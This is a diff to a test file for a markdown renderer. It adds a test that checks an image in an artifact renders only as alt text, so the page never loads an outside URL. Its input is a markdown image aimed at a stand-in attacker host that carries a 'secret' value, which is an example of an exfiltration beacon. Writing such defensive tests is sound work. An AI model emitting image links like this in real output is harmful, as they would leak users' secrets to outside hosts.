@@ -31,3 +31,13 @@ test("fenced callgraphs keep their indentation and line breaks", () => {
   expect(html).toContain("root\n  child\n    leaf\n| code | not a table |");
   expect(html).not.toContain("<table>");
 });
+
+test("an image in an artifact renders as its alt text, so the page fetches nothing a worker named", () => {
+  const html = renderToStaticMarkup(
+    <WallMarkdown>{"Result: ![the chart](https://attacker.example/c.png?d=secret)"}</WallMarkdown>,
+  );
+
+  expect(html).not.toContain("<img");
+  expect(html).not.toContain("attacker.example");
+  expect(html).toContain("the chart");
+});
